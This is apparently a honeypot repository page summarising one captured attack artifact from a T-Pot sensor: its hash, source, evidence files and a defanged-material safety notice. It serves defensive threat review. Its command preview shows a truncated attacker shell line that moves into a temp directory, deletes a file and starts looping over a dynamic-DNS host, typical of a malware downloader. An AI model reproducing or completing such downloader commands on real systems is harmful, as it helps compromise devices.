# b33d2d14fb389b136e176dba1683872897232463edc6ab5f5072153fcdd96d14

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `b33d2d14fb389b136e176dba1683872897232463edc6ab5f5072153fcdd96d14` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata, detections |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
[4hroot@fedora-edge:~# cd /data/local/tmp 2>/dev/null||cd /tmp;rm -f /data/local/tmp/.d;for h in x9k4p7m2q5r8t3v6.mooo.c
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
